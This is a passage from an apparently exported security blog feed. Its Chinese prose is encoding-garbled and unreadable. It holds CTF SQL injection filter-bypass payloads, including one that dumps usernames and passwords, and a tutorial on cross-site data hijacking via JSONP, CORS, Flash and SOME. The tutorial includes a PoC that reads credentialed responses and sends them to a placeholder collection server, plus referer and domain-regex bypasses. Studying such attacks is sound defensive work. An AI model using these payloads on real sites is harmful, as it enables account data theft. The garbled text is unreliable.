tablesÁªïËøáÔºåÁÑ∂ÂêéÊèêÁ§∫str_replace‰∏∫Á©∫ÔºåÊâÄ‰ª•ÈúÄË¶ÅÂèåÂÜôÔºåËøôÈáåÈúÄË¶Åfuzz‰∏Ä‰∏ãËøáÊª§ÁöÑ‰∏úË•ø„ÄÇÁÑ∂ÂêéÂèåÂÜôselectÂíåfromÂç≥ÂèØÁªïËøá11&apos;+and+if+((ascii(mid((seselectlect+table_name+frofromm+information_schema+.+tables+limit+1),1,1))&gt;1),sleep(3),0)%23 ËøôÈáåËøòÊúâ‰∏Ä‰∏™ÊòæÊ≥®ÁöÑÊñπÊ≥ïÔºö1id=sd&apos; unifromon selselectect (seselectlect group_concat(username,&apos;:&apos;,password)frfromom web.user),2#: https://xz.aliyun.com/t/3153#toc-3 Êé•‰∏ãÊù•Â∞±ÊòØ‰∏Ä‰∏™Êñá‰ª∂‰∏ä‰º†ËøôÈáåÂæóÊÉ≥ÂäûÊ≥ïÊà™Êñ≠txt,ÊàñËÆ∏ÊòØnginxËß£ÊûêÊºèÊ¥ûÔºü sn00pyÂ∏àÂÇÖÊïôÊàëfuzzÔºå0x00-&gt;0xff ÁÑ∂ÂêéÂ∞ùËØïÊà™Êñ≠ÂêéÈù¢ÁöÑtxtÔºåÂÖàÁî®ËÑöÊú¨ÁîüÊàê‰∏Ä‰∏ãÂ≠óÂÖ∏12345for i in range(0,256): i = bytes(chr(i), &apos;utf8&apos;) with open(&quot;dic.txt&quot;, &quot;ab+&quot;) as f: f.write(i) f.write(bytes(&apos;\n&apos;, &apos;utf-8&apos;))]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ë∑®Á´ôÊï∞ÊçÆÂä´ÊåÅ]]></title>
    <url>%2F2018%2F09%2F16%2F%E8%B7%A8%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8A%AB%E6%8C%81%2F</url>
    <content type="text"><![CDATA[Â≠¶‰π†‰∫Ü‰∏Ä‰∏ãÂ∏∏ËßÅÁöÑÂâçÁ´ØÊºèÊ¥û 0x01 Âü∫Á°Ä‰∏ÄÔºöHTTPÂçèËÆÆ ËØ∑Ê±ÇË°åGET /images/logo.gif HTTP/1.1 HTTP ËØ∑Ê±ÇÂ§¥ Authorization Origin Cookie Host Referer User-Agent X-Forwarded-For 3.HTTP ÂìçÂ∫îÂ§¥ Access-Control-Allow-Origin Access-Control-Allow-Credentials Location Set-Cookie X-XSS-Protection Content-Security-Policy server X-Powered-By X-Frame-Options ‰∫åÔºö ‰ªÄ‰πàÊòØCSP(Content Security Policy)ÔºüCSPÊòØ‰∏ÄÁßçÁî±ÂºÄÂèëËÄÖÂÆö‰πâÁöÑÂÆâÂÖ®ÊîøÁ≠ñÂ£∞ÊòéÔºåÈÄöËøácspÁ∫¶ÊùüÁöÑËßÑÂàôÊåáÂÆöÂèØ‰ø°ÁöÑÂÜÖÂÆπÊù•Ê∫ê„ÄÇÂåÖÊã¨ËÑöÊú¨„ÄÅÂõæÁâá„ÄÅiframe„ÄÅstyleÁ≠âÂèØËÉΩÁöÑËøúÁ®ãËµÑÊ∫ê„ÄÇCSP‰∏ªË¶ÅÊòØ‰∏∫‰∫ÜÂáèÁºìXSS„ÄÅclickjackingÂíåÂÖ∂‰ªñÁöÑ‰∏Ä‰∫õ‰ª£Á†ÅÊ≥®ÂÖ•ÁöÑÊîªÂáªÔºåÁõÆÁöÑÊòØÂ∞ΩÈáè‰ΩøÂèØÊâßË°åÁöÑÂÜÖÂÆπ‰ªéÂèØ‰ø°ÁöÑÁõÆÊ†á‰º†ÈÄíËøáÊù•„ÄÇ CSPÁöÑÊµèËßàÂô®ÊîØÊåÅÊÉÖÂÜµCSPÊúâ‰∏â‰∏™headerÔºö Content-Security-PolicyÔºöchrome 25+ÔºåFirefox 23+ÔºåOpera 19+ X-Content-Security-PolicyÔºöFirefox 23+ÔºåIE10+ X-WebKit-CSPÔºöChrome 25+ Êó•Â∏∏ËßÅÂà∞ÊúÄÂ§öÁöÑÂ∞±ÊòØContent-Security-Policy HeaderÔºö CSPÊîØÊåÅÁöÑÊåá‰ª§ÂèÇËÄÉÔºöhttps://content-security-policy.com/1default-src,script-src,object-src,style-src,img-src,media-src,frame-src,font-src,connect-src,form-action,sandbox,script-nonce,plugin-types,reflected-xss,report-uri È¢ÑËÆæÁöÑÂÄºÊúâ1234none: ‰∏çÂåπÈÖç‰ªª‰Ωï‰∏úË•øself: ÂåπÈÖçÂΩìÂâçÂüüÔºå(‰∏çÂåÖÊã¨Â≠êÂüüÔºåÊØîÂ¶Çexample.comÂèØ‰ª•Ôºåapi.example.com Âàô‰ºöÂåπÈÖçÂ§±Ë¥•„ÄÇ)unsafe-inline ÂÖÅËÆ∏ÂÜÖÂµåÁöÑËÑöÊú¨ÂèäÊ†∑Âºè„ÄÇÊòØÁöÑÔºåÊ≤°ÁúãÈîôÔºåÂØπ‰∫éÈ°µÈù¢‰∏≠ÂÜÖÂµåÁöÑÂÜÖÂÆπ‰πüÊòØÊúâÁõ∏Â∫îÈôêÂà∂ËßÑÂàôÁöÑ„ÄÇunsafe-eval ÂÖÅËÆ∏ÈÄöËøáÂ≠óÁ¨¶‰∏≤Âä®ÊÄÅÂàõÂª∫ÁöÑËÑöÊú¨ÊâßË°åÔºåÊØîÂ¶ÇevalÔºåsetTimeout Á≠â„ÄÇ ËøòÊúâÁöÑÂ∞ÜÂÄº‰ΩçÁΩÆ‰∏∫nonceÂÄºÔºå‰∏Ä‰∏™ÈöèÊú∫ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåË°®Á§∫Âè™Âä†ËΩΩÂê´ÊúâËØ•ÈöèÊú∫Â≠óÁ¨¶‰∏≤ÁöÑÊñá‰ª∂„ÄÇ ÊµèËßàÂô®ÂÆâÂÖ®Á≠ñÁï•ËØ¥‰πãÂÜÖÂÆπÂÆâÂÖ®Á≠ñÁï•CSP ‰∏âÔºö ÂêåÊ∫êÁ≠ñÁï•(SOP)ÂèàÊòØ‰ªÄ‰πàÔºüÂêåÊ∫êÁ≠ñÁï•ÈôêÂà∂‰∫Ü‰ªéÂêå‰∏Ä‰∏™Ê∫êÂä†ËΩΩÁöÑÊñáÊ°£ÊàñËÑöÊú¨Â¶Ç‰Ωï‰∏éÊù•Ëá™Âè¶‰∏Ä‰∏™Ê∫êÁöÑËµÑÊ∫êËøõË°å‰∫§‰∫í„ÄÇËøôÊòØ‰∏Ä‰∏™Áî®‰∫éÈöîÁ¶ªÊΩúÂú®ÊÅ∂ÊÑèÊñá‰ª∂ÁöÑÈáçË¶ÅÂÆâÂÖ®Êú∫Âà∂„ÄÇÁõ∏ÂêåÊ∫êÔºöÂΩì‰∏§‰∏™ÂüüÂÖ∑ÊúâÁõ∏ÂêåÁöÑÂçèËÆÆÔºåÁõ∏ÂêåÁöÑÂüüÂêçÔºåÂêåÁ´ØÂè£ÔºåËØ¥ÊòéËøôÊòØÁõ∏ÂêåÊ∫ê„ÄÇ ÂõõÔºöÈÇ£‰πàÂ¶Ç‰ΩïË∑®ÂüüËé∑ÂèñËµÑÊ∫êÔºüÁî±‰∫éÂèóÂà∞ÂêåÊ∫êÁ≠ñÁï•ÁöÑÂΩ±ÂìçÔºåË∑®ÂüüÊï∞ÊçÆ‰ºöÂèóÂà∞Âà∂Á∫¶„ÄÇ‰ΩÜÊòØ‰∫∫‰ª¨ÊÉ≥Âá∫‰∫ÜÂæàÂ§öË∑®ÂüüÁöÑÊñπÂºè„ÄÇ https://juejin.im/entry/58a3ca13128fe10058c5863b Jsonp CORS(Cross-Origin Resource Sharing) Cross-document messaging document.domain Â±ûÊÄß WebSocket ‰∫îÔºöJsonpÂéüÁêÜÂÖ∂ÂÆûÂæàÁÆÄÂçïÔºåÂ∞±ÊòØÂà©Áî®&lt;script&gt;Ê†áÁ≠æÊ≤°ÊúâË∑®ÂüüÈôêÂà∂ÁöÑ‚ÄúÊºèÊ¥û‚Äù,ËææÂà∞‰∏éÁ¨¨‰∏âÊñπÈÄöËÆØÁöÑÁõÆÁöÑÔºåÂΩ¢Â¶ÇÔºö1&lt;script src=&quot;https://www.example.net/api?callback=Passer6y&quot;&gt;&lt;/script&gt; ÂÆ¢Êà∑Á´Ø‰º†ÈÄí‰∏Ä‰∏™callbackÂèÇÊï∞ÁªôÊúçÂä°Á´Ø-&gt;ÊúçÂä°Á´ØÁî®callbackÂèÇÊï∞ÂåÖË£π‰ΩèjsonÊï∞ÊçÆ(Â∞Üpasser6yÂΩìÂáΩÊï∞ÂêçÔºåjsonÊï∞ÊçÆÂΩìÂáΩÊï∞ÁöÑÂèÇÊï∞)-&gt;ÂÆ¢Êà∑Á´Øjs‰∏≠ÁöÑ(passer6y)ÂõûË∞ÉÊï∞ÊçÆ„ÄÇÁÆÄÂçïÁêÜËß£‰∏∫ÔºöÂ∏¶callbackÁöÑjsonÂ∞±ÊòØjsonpÂÆûÁé∞ËøáÁ®ãÂ¶Ç‰∏ãÔºöAÁΩëÁ´ôÊÉ≥Ë¶ÅËé∑ÂèñBÁΩëÁ´ôÁöÑÁî®Êà∑Êï∞ÊçÆÔºåAÁΩëÁ´ô‰∏≠jsÂÜôÊ≥ïÂ¶Ç‰∏ãÔºö1234567891011&lt;script type=&quot;text/javascript&quot;&gt; var script = document.createElement(&apos;script&apos;); var url = &apos;https://127.0.0.1/server.php?callback=passer6y&apos;; script.src = url; document.body.appendChild(script); function passer6y(json) &#123; var obj = JSON.parse(json); alert(obj); &#125;&lt;/script&gt; BÁΩëÁ´ôÂ∞ÜÊï∞ÊçÆÊâìÂåÖÂ•ΩÔºåÂõû‰º†ÁªôAÁΩëÁ´ôÔºåÂπ∂Ë∞ÉÁî®AÁ´ôÁöÑpasser6yÂáΩÊï∞Ôºö1234567&lt;?php$userInfo = &apos;FDrag0n&apos;;$jsdata = json_encode($userInfo);!empty($_GET[&apos;callback&apos;]) ? $_GET[&apos;callback&apos;] : &apos;callback&apos;;echo $_GET[&apos;callback&apos;].&apos;(&apos;.json_encode($jsdata).&apos;)&apos;;?&gt; AÁΩëÁ´ôÊâßË°åpaser6yÂáΩÊï∞Ôºö ËøòÊúâ‰∏Ä‰∫õÂÖ∂‰ªñÊ†áÁ≠æË∑®ÂüüÁöÑÊñπÊ≥ïÔºöhttps://www.anquanke.com/post/id/97671 ÂÖ≠ÔºöCORSÔºöË∑®ÂüüËµÑÊ∫êÂÖ±‰∫´Âõ†‰∏∫ÊµèËßàÂô®‰ºöÈôêÂà∂‰ªéËÑöÊú¨ÂèëËµ∑ÁöÑË∑®ÂüüHTTPËØ∑Ê±Ç(ÊØîÂ¶ÇÔºöXMLHttpRequest„ÄÅFetch APIs)ÔºåËÄå‰∏îjsonp‰º†ËæìÊï∞ÊçÆÈöæ‰ª•ÂÅöÊùÉÈôêÊ†°È™åÔºåÂ¶ÇÊûú‰º†ËæìËøáÁ®ãÊ∂âÂèäÊïèÊÑü‰ø°ÊÅØÔºåÊÅ∂ÊÑèÁöÑÁΩëÁ´ôBÂ∞ÜÊï∞ÊçÆjsonpÁöÑÊï∞ÊçÆÊé•Âè£ÂµåÂÖ•Ëá™Â∑±ÁöÑÁΩëÁ´ôÈ°µÈù¢Ôºå‰ªéËÄåÁî®Êà∑ËÆøÈóÆËÄÖÊµèËßàBÈ°µÈù¢ÁöÑÊó∂ÂÄôÔºåÂ∞ÜÂÖ∂Âú®AÁ´ôÁöÑÊïèÊÑüÊï∞ÊçÆÁõóÂèñ(CSRF)„ÄÇËøôÊó∂ÂÄôÂ∞±Âá∫Áé∞‰∫ÜCORS„ÄÇ Âê¶ÂàôÂ∞±‰ºöË¢´ÂêåÊ∫êÁ≠ñÁï•ÈôêÂà∂Ôºö ËØ¶ÊÉÖÔºöMDN CORS Docs Â¶ÇÊûúËÆæÁΩÆÂÖÅËÆ∏ÂèëÈÄÅcookie:Access-Control-Allow-Credentials: trueÔºåÈÇ£‰πàÂ∞±ÂíåCSRF‰∏ÄÊ†∑‰∫Ü„ÄÇ Ë∑®ÂüüËµÑÊ∫êÂÖ±‰∫´CORSËØ¶Ëß£ 0x02 Jsonp Âä´ÊåÅ1.Âà©Áî®Êù°‰ª∂Ôºö ‰ΩøÁî®JsonpËé∑ÂèñÊï∞ÊçÆ Ê≤°ÊúâÊ†°È™årefererÔºåÊàñrefererÂèØÁªïËøá GETËØ∑Ê±Ç‰∏≠‰∏çÂåÖÂê´tokenÁõ∏ÂÖ≥ÂèÇÊï∞„ÄÇ DiscoverÔºüÊåñÊéòJsonpÊºèÊ¥ûÁöÑÂÖ≥ÈîÆÂ∞±ÊòØÂØªÊâæÂõûË∞ÉÂáΩÊï∞ÔºåÂ∏∏ËßÅÁöÑCallbackÂèÇÊï∞Â¶Ç‰∏ãÔºö12345678910callback cb jsonp jsonpcallback jsonpcb jsonp_cb json= jsoncallback jcbcall Â¶Ç‰ΩïËá™Âä®ÂåñÊü•ÊâæËøôÊ†∑ÁöÑÊé•Âè£ÔºüËøáÊª§burpsuite/FiddlerËÆ∞ÂΩïÔºå‰∏Ä‰∏™‰∏Ä‰∏™ÁöÑ‰∫∫Â∑•ÊéíÊü•„ÄÇÊàñËÄÖÁî®Selenium + Proxy + È™åËØÅËÑöÊú¨Ôºö Selenium: Âú®ÁΩëÈ°µ‰∏äÁûéÁÇπÊåâÈíÆ„ÄÅË∂ÖÈìæÊé•Á≠â ProxyÔºö ËÆ∞ÂΩïÊâÄÊúâËØ∑Ê±ÇÔºåËøáÊª§Â∏¶ÊúâÊïèÊÑü‰ø°ÊÅØÁöÑjsonpËØ∑Ê±ÇÔºåÂπ∂ËÆ∞ÂΩï‰∏ãHTTPËØ∑Ê±Ç È™åËØÅËÑöÊú¨ÔºöÂéªÊéâRefererÂ≠óÊÆµÔºåÂÜçÊ¨°ÂèëÈÄÅËØ∑Ê±Çjsonp_info_leak Tools ExploitÂ∞ÜÂê´ÊúâjsonpÂä´ÊåÅÊºèÊ¥ûÁöÑÊï∞ÊçÆÊé•Âè£ÂµåÂÖ•Êàë‰ª¨ÁöÑAttackÁ´ô‰∏äÔºåÁî®Êà∑ÁÇπÂºÄÁ™ÉÂèñÂèóÂÆ≥ËÄÖË¥¶Êà∑‰ø°ÊÅØ 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;xxxx CORs Poc&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h2&gt;xxxx CORs POC&lt;/h2&gt; &lt;button type=&quot;button&quot; onclick=&quot;cors()&quot;&gt;Poc&lt;/button&gt; &lt;/div&gt; &lt;script&gt; function cors()&#123; var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() &#123; if(this.readyState == 4 &amp;&amp; this.status == 200) &#123; document.location=&apos;https://ËÆ∞ÂΩïÊï∞ÊçÆÁöÑÊúçÂä°Âô®Âú∞ÂùÄ?&apos;+escape(this.responseText); &#125; &#125;; xhttp.open(&apos;GET&apos;,&apos;https://jsonpÊé•Âè£&apos;,true); xhttp.withCredentials = true; xhttp.send(); &#125;&lt;/script&gt; BypassÊ≠£ÂàôÈÖçÁΩÆ‰∏çÂΩìÁªïËøáÔºö.*domain\.com-&gt;domain.com.evil.meÁ©∫refererÁªïËøáÔºö&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt; jsonpË∑®Âüü‰º†ËæìÁöÑurlÂèØÊéßÁöÑËØùÔºåËØ¥‰∏çÂÆöËøòËÉΩÈÄ†ÊàêxssÁ≠âÂÖ∂‰ªñÈóÆÈ¢ò ÂèÇËÄÉÔºö Â¶Ç‰ΩïÊåñÊéòJsonpÊºèÊ¥ûJSONP‰∏éCORSÊºèÊ¥ûÊåñÊéò 0x03 FlashË∑®ÂüüÊï∞ÊçÆÂä´ÊåÅFlashË∑®ÂüüËÆøÈóÆÁöÑÊó∂ÂÄô‰∏ªË¶ÅÂèóÂà∞crossdomain.xmlÊñá‰ª∂ÁöÑÂΩ±ÂìçÔºåÂΩìAÁΩëÁ´ôÂµåÂÖ•‰∏Ä‰∏™FlashÔºåÁÑ∂ÂêéFlashË∑®ÂüüËØ∑Ê±ÇBÁΩëÁ´ô‰∏ãÁöÑËµÑÊ∫êÔºåËøô‰∏™Êó∂ÂÄôÂ∞±‰ºöÂÖàÊü•ÁúãBÁΩëÁ´ô‰∏ãÁöÑcrossdomain.xmlÊñá‰ª∂ÊòØÂê¶ÂÖÅËÆ∏AÁΩëÁ´ôFlashËØ∑Ê±ÇBÁΩëÁ´ôÁöÑËµÑÊ∫ê„ÄÇ Ê®°ÊùøÁ´ôÁÇπ‰∏ãÂøÖÈ°ªÂ≠òÂú®crossdomain.xmlÔºå‰∏îÈÖçÁΩÆÂæ™Â∫èÂÖ∂‰ªñÂüüÁöÑASËÑöÊú¨ËøõË°åË∑®ÂüüËØ∑Ê±Ç1234&lt;?xml version=&quot;1.0&quot;?&gt;&lt;cross-domain-policy&gt;&lt;allow-access-from domain=&quot;*&quot; /&gt;&lt;/cross-domain-policy&gt; Â¶ÇÊûúallow-access-from domainË¢´ËÆæÁΩÆ‰∏∫*ÂêéÔºåÂèØËÉΩÈÄ†ÊàêFlash CsrfÁöÑÈ£éÈô©(ÂêåÊó∂Ëøô‰πüÊòØÊàë‰ª¨ÊêúÈõÜÂ≠êÂüüÂêçÁöÑ‰∏ÄÁßçÊñπÂºè~)„ÄÇ DiscoverÂà©Áî®Êù°‰ª∂Âç≥Ôºöcrossdomain.xml‰∏≠ÁöÑallow-access-from domain=*ÊàñËÄÖËøáÊª§ËßÑÂàô‰∏ç‰∏•„ÄÇÊâÄ‰ª•ÂèØ‰ª•Áà¨Ë°åÁΩëÁ´ôÁöÑÂÖ®ÈÉ®ÂüüÂêçË∑üÁõÆ‰∏ãÁöÑcrossdomain.xmlÊñá‰ª∂ÊòØÂê¶Â≠òÂú®ÈÖçÁΩÆÊºèÊ¥ûÊàñËÄÖGoogle Hacking:inurl:crossdomain filetype:xml„ÄÇÂÖ∂Ê¨°ÈúÄË¶ÅÊâæÂà∞‰∏Ä‰∏™ËÉΩËé∑ÂèñÊïèÊÑü‰ø°ÊÅØÁöÑÊé•Âè£ÔºåÁÑ∂ÂêéÊûÑÂª∫swfÁöÑpocÂØπÂ§ñÂèëÈÄÅhttpËØ∑Ê±Ç„ÄÇ ËøòÊúâ‰∏ÄÁßçÊÉÖÂÜµ,ÂèØ‰ª•Êó†ËßÜcrossdomain.xmlÊñá‰ª∂: Êñá‰ª∂‰∏ä‰º†+Flash csrfÂ∞±ÊòØÂ¶ÇÊûúÊúâallow-access-from domain=A.victim.comÁöÑÈôêÂà∂ÔºåÂàôÂè™ËÉΩÂéªÂÖÅËÆ∏ÁöÑÂüü‰∏ãÊâæ‰∏ä‰º†ÁÇπ,ÁÑ∂Âêé‰∏ä‰º†swfÁöÑexp(Êâ©Â±ïÂêçÈöè‰æøÊç¢)ÔºåÁÑ∂ÂêéÂàõÂª∫Attack.comÈ°µÈù¢ÔºåÁî®objectÊ†áÁ≠æÂéªÂåÖÂê´Êàë‰ª¨‰∏ä‰º†Âú®victim.comÁ´ôÂÜÖÁöÑswfÊñá‰ª∂ÔºåÊúâÁî®Êà∑ËÆøÈóÆAttack.comÁöÑÊó∂ÂÄôÔºåÂ∞±‰ºöÂä†ËΩΩvictim.com‰∏≠ÁöÑswf expÂêëÊïèÊÑüÊï∞ÊçÆÊé•Âè£ÂèëÈÄÅhttpËØ∑Ê±ÇÁ≠âÔºåÈÄ†ÊàêË∑®ÂüüÊï∞ÊçÆÂä´ÊåÅ„ÄÇ Exploit POCÔºöCross-Site Content (Data) Hijacking (XSCH) PoC Project ËøôÈáåÊú¨Âú∞Êê≠Âª∫Â•ΩÊµãËØïÁöÑËøáÁ®ãÔºö ÊàñËÄÖ‰ΩøÁî®Flash ActionScriptË∑®ÂüüÂèëÈÄÅËØ∑Ê±Ç1234import flash.net.*;var _l = new URLLoader(new URLRequest(‚Äúhttps://ÁõÆÊ†áÁ´ôÁÇπ/&quot;));_l.addEventListener(Event.COMPLETE,function()&#123;text1.text = _l.data&#125;);_l.load(); Ê°à‰æãÔºöFlashË∑®ÂüüÊï∞ÊçÆÂä´ÊåÅÂç≥‰Ωø‰∏ä‰º†JPGÊñá‰ª∂‰πüÂèØËÉΩÂØºËá¥Ë∑®Á´ôÁÇπÂÜÖÂÆπÂä´ÊåÅ 0x04 CORSË∑®ÂüüËµÑÊ∫êËØªÂèñËøô‰∏™Ê≤°Âï•Â•ΩËØ¥ÁöÑÔºåÈÖçÁΩÆ‰∏çÂΩìÂØºËá¥ÔºåÁúãÂà∞access-Control-Allow-Origin‰∏∫*ÔºåÊàñËÄÖÂèØÁªïËøá„ÄÇÁÑ∂ÂêéËøòAccess-Control-Allow-Credentials‰∏∫TRUE,ÂèëÈÄÅcookieÔºåÂíåCSRF‰∏ÄÊ†∑Ôºå demoÔºöVictim.comÔºö1234&lt;?phpheader(&apos;Access-Control-Allow-Origin: *&apos;);//header(&apos;Access-Control-Allow-Credentials:true&apos;);echo &quot;Fdrag0n love bed&quot;; Attack.com:12345678910&lt;script&gt;var request = new XMLHttpRequest();request.open(&quot;GET&quot;, &quot;https://107.175.17.240/1.php&quot;, true);request.send();request.onreadystatechange = function()&#123; if(request.readyState === 4 &amp;&amp; request.status === 200)&#123; alert(request.responseText); &#125;&#125;&lt;/script&gt; Âπ≥Âè∞Cross-Site Content (Data) Hijacking (XSCH) PoC Project SilverlightË∑®ÂüüPostMessage0x05 SomeÊîªÂáª(Same Origin Method Execution)SOMEÔºåÁ±ª‰ºº‰∫éHijkingÊîªÂáªÔºåÊòØÂêåÊ∫ê‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÁöÑÁÆÄÁß∞„ÄÇ Âç±ÂÆ≥ÔºöÁêÜËÆ∫‰∏ä‰ªª‰ΩïÂÖ∑Â§áÁÇπÂáªÂäüËÉΩÁöÑÁΩëÁ´ôÈÉΩÂ≠òÂú®ËøôÁßçÊîªÂáªÁöÑÂèØËÉΩÔºåÁº∫Èô∑Â∞±ÊòØ‰∏çËÉΩÂ∏¶ÂèÇÊï∞ËøõË°åÊìç‰Ωú Âà©Áî®Êù°‰ª∂ JsonpÂõûË∞ÉÂÄºÂèØÊéß Ê≤°ÊúâËøáÊª§.Á¨¶Âè∑ÂíåÂáΩÊï∞ ÂéüÁêÜ‰∫î‰∏™È°µÈù¢Ôºöindex.html„ÄÅstep1.html„ÄÅjsonp.html„ÄÅjson_data.php„ÄÅfunction.htmlindex.html1234567891011121314151617&lt;html&gt;&lt;head&gt;&lt;title&gt;SOME Main&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;a href=&quot;step1.html&quot; target=&quot;_blank&quot; &gt;aaaaaaa&lt;/a&gt;&lt;script type=&quot;text/javascript&quot;&gt; function startSOME() &#123; myWindow=window.open(&apos;https://127.0.0.1/step1.html&apos;,&apos;&apos;,&apos;width=200,height=100&apos;); window.location.href = &quot;https://127.0.0.1/function.html&quot;;&#125; startSOME();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; step1.html12345678910&lt;html&gt;&lt;script&gt;function waitForDOM() &#123; window.location.href =&quot;https://127.0.0.1/jsonp.php?callback=window.opener.shareAllPhotos&quot;;&#125;setTimeout(waitForDOM,3000);&lt;/script&gt;&lt;/html&gt; jsonp.php1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Vulnerable JSONP endpoint caller&lt;/title&gt;&lt;?phpecho &apos;&lt;script src=&quot;https://127.0.0.1/jsonp_data.php?callback=&apos;.$_GET[&quot;callback&quot;].&apos;&quot;&gt;&lt;/script&gt;&apos;?&gt;&lt;/head&gt;&lt;/html&gt; json_data.php12345&lt;?phpecho $_GET[&quot;callback&quot;] . &quot;(&#123; Fdrag0n : &apos;Fdrag0n L0ve sleep&apos; &#125;);&quot;;?&gt; function.html1234567891011121314&lt;html&gt;&lt;head&gt;&lt;title&gt;Google Photos&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; function shareAllPhotos(data) &#123; prompt(data.Fdrag0n); &#125; console.log(window.opener); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; Exploit&amp;Toolshttps://github.com/linkedin/sometime Defence ÂõûË∞ÉÂÄºÂõ∫ÂÆö(ÊàñËÄÖÁôΩÂêçÂçï)ÔºåÂ§ñÈÉ®‰∏çÂèØÊéß Game:Same Origin Method Execution 0x07 ÁªÑÂêàÊã≥Ëá™Â∑±ËáÜÊÉ≥ÁöÑÂá†Áßç‚Ä¶ ËøòÊ≤°ÊúâÂÆûÁé∞ XSS+CORSÊï∞ÊçÆÂä´ÊåÅÁªïËøáaccess-Control-Allow-Origin Êñá‰ª∂‰∏ä‰º†(ÂõæÁâá„ÄÅPDF„ÄÅtxtÈÉΩË°å) + Flash CsrfÁªïËøácrossdomain Practice1.]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÊµÖÊûêÂèçÂêë‰ª£ÁêÜ]]></title>
    <url>%2F2018%2F07%2F05%2F%E6%B5%85%E6%9E%90%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[ÊúÄËøëËøôÊÆµÊó∂Èó¥È¢ëÈ¢ëÊé•Ëß¶Âà∞Âèç‰ª£ÁöÑ‰∏úË•øÔºåÊâÄ‰ª•Â∞±Êõ¥Ëøõ‰∏ÄÊ≠•ÁöÑ‰∫ÜËß£‰∫Ü‰∏ÄÁï™, Êúâ‰ªÄ‰πà‰∏çÂØπÁöÑÂú∞ÊñπËøòËØ∑Â§ß‰Ω¨‰ª¨ÊåáÊ≠£~Êú¨ÊñáÈúÄË¶ÅÁî®Âà∞ÁöÑ‰ª£Á†ÅÂ∑≤‰∏ä‰º†GithubÊú¨ÊñáÁî±ÂÆâÂÖ®ÂÆ¢ÂéüÂàõÂèëÂ∏É Êú¨ÊñáÊ∂âÂèäÂà∞ÁöÑ‰∏úË•ø‰ªÖ‰æõÊäÄÊúØÁ†îÁ©∂ÔºåËØ∑ÂãøÁî®‰∫éÈùûÊ≥ïÁî®ÈÄîÔºåÂê¶ÂàôÂêéÊûúËá™Ë¥ü ÊµÖÊûêÂèçÂêë‰ª£ÁêÜ0x01: ÂâçË®ÄÊúÄËøëÊääÂçöÂÆ¢ÈáçÊñ∞ÂºÑ‰∫Ü‰∏Ä‰∏ãÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÁâπÂà´ÊúâÊÑèÊÄùÁöÑ‰∏úË•øÔºåÁúãÂõæ~ ËøòÊúâ‰∏Ä‰∫õÊúâÊÑèÊÄùÁöÑ‰∏úË•øÔºåÊØîÂ¶ÇÂèç‰ª£Ë∞∑Ê≠å(Ë∞∑Ê≠åÈïúÂÉèÁ´ô)„ÄÅÈíìÈ±º„ÄÅÁªïËøáÂõΩÂÜÖÂ§áÊ°àÂíåÁ∫ø‰∏ãCTF‰∏≠ÁöÑ‰∏Ä‰∫õÈ™öÊìç‰ΩúÔºåÁ≠âÁ≠â„ÄÇ 0x02: ÁÆÄ‰ªãÂèçÂêë‰ª£ÁêÜÔºåÁÆÄËÄåË®Ä‰πãÂ∞±ÊòØÂèçÂêë‰ª£ÁêÜÊúçÂä°Âô®‰ªéÁõÆÊ†áÂÜÖÂÆπÊúçÂä°Âô®‰∏äÊäìÂèñÂÜÖÂÆπËøîÂõûÁªôÁî®Êà∑ÔºåÂèçÂêë‰ª£ÁêÜÊúçÂä°Âô®ÂÖÖÂΩì‰∏Ä‰∏™‰∏≠‰ªãÂäüËÉΩÔºå‰ªñÊú¨Ë∫´ÊòØÊ≤°Êúâ‰ªª‰ΩïÂÜÖÂÆπÁöÑ„ÄÇÂå∫Âà´‰∫éÊ≠£Âêë‰ª£ÁêÜËÄåË®ÄÔºåÂèçÂêë‰ª£ÁêÜÊòØ‰ª£ÁêÜÁöÑÊúçÂä°Á´ØÔºåËÄåÊ≠£Âêë‰ª£ÁêÜÊòØ‰ª£ÁêÜÁöÑÂÆ¢Êà∑Á´Ø„ÄÇ ÂÜçÊù•ÁÆÄÂçï‰ªãÁªç‰∏Ä‰∏ãÊàëÂú®ÂâçË®Ä‰∏≠ÊâÄËØ¥ÁöÑÊàëËÆ©ÊàëÁöÑÂçöÂÆ¢ipÊòØÂ¶Ç‰ΩïÂèòÊàê1.1.1.1ÁöÑÔºåÂÖ∂ÂÆû1.1.1.1ÊòØ‰∏ÄÂè∞DNSÊúçÂä°Âô®(Âè∑Áß∞ÂÖ®ÁêÉÊúÄÂø´ÁöÑDNS)ÔºåÊ≠£Â•Ω1.1.1.1ÂèàÊòØcf cdn‰∏≠ÁöÑ‰∏Ä‰∏™ËäÇÁÇπ„ÄÇËøôÊ†∑Êàë‰ª¨Â∞±ÂèØ‰ª•Â∞ÜÂüüÂêçËß£ÊûêÂà∞1.1.1.1ÔºåÁÑ∂ÂêéÂú®cf‰∏≠ËÆæÁΩÆÂ•ΩÁúüÂÆûÁöÑÂõûÊ∫êÂú∞ÂùÄÂç≥ÂèØ„ÄÇÂú®ÊñáÊú´Â∑≤ÈôÑ‰∏äÊïôÁ®ãÈìæÊé•ÔºåÊÑüÂÖ¥Ë∂£ÁöÑÂèØ‰ª•Áé©Áé©~ 0x03: 